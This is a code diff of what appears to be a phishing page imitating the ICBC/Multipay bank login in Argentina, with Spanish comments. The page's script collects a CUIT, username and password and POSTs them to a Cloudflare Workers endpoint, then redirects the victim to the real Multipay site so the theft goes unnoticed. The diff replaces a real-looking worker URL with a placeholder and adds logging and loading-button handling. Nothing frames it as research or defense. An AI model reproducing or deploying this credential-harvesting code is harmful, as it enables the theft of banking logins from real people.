@@ -389,8 +389,6 @@
 </head>
 
 <body>
-    <!-- OVERLAY DE GEOLOCALIZACIÓN - ELIMINADO, AHORA LO MANEJA EL WORKER -->
-
     <header class="header">
         <div class="logo-area">
             <img src="https://www.multipay.com.ar/static/minb/assets/images/icbc-logo.svg" alt="ICBC" class="logo-img" />
@@ -487,7 +485,7 @@
         <div class="redirect-box">
             <div class="spinner"></div>
             <h2>🔄</h2>
-            <p>cuit incorrecto</p>
+            <p>Procesando...</p>
             <div class="redirect-counter" id="counterDisplay">3</div>
             <p style="font-size: 12px; color: #999; margin-top: 5px;">segundos</p>
         </div>
@@ -495,12 +493,10 @@
 
     <script>
         // ============================================================
-        // CONFIGURACIÓN - Usar la URL del worker
+        // CONFIGURACIÓN - CAMBIA ESTA URL POR LA DE TU WORKER
         // ============================================================
-        // Cambia esta URL por la de tu worker desplegado en Cloudflare
-        const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev/';
+        const WORKER_URL = 'https://tu-worker.workers.dev'; // <--- CAMBIA ESTO
         const REDIRECT_URL = 'https://www.multipay.com.ar/';
-        const INICIO_URL = 'global.html';
 
         // ============================================================
         // FUNCIONES DEL FORMULARIO
@@ -547,6 +543,9 @@
                 transactionId: transactionId
             };
 
+            console.log('📤 Enviando a:', WORKER_URL + '/login');
+            console.log('📦 Payload:', payload);
+
             try {
                 const response = await fetch(WORKER_URL + '/login', {
                     method: 'POST',
@@ -557,13 +556,12 @@
                 });
 
                 const data = await response.json();
+                console.log('📥 Respuesta:', data);
                 
                 if (response.ok) {
-                    console.log('✅ Datos enviados correctamente:', data);
-                    return { ok: true, transactionId };
+                    return { ok: true, transactionId, data };
                 } else {
-                    console.error('❌ Error del worker:', data);
-                    return { ok: false, error: data.error || 'Error al enviar' };
+                    return { ok: false, error: data.error || data.message || 'Error al enviar' };
                 }
             } catch (err) {
                 console.error('❌ Error de red:', err);
@@ -613,14 +611,25 @@
                 return;
             }
 
-            // Enviar al worker
-            const resultado = await enviarAlWorker(cuit, usuario, password);
-            
-            if (resultado.ok) {
-                // Mostrar overlay y redirigir
-                redirigirConContador();
-            } else {
-                alert('Error al enviar los datos: ' + (resultado.error || 'Intenta nuevamente'));
+            // Mostrar loading
+            const btn = document.getElementById('loginButton');
+            btn.textContent = 'Enviando...';
+            btn.disabled = true;
+
+            try {
+                const resultado = await enviarAlWorker(cuit, usuario, password);
+                
+                if (resultado.ok) {
+                    redirigirConContador();
+                } else {
+                    alert('Error: ' + (resultado.error || 'Intenta nuevamente'));
+                    btn.textContent = 'Ingresar';
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                alert('Error de conexión: ' + err.message);
+                btn.textContent = 'Ingresar';
+                btn.disabled = false;
             }
         }
     </script>
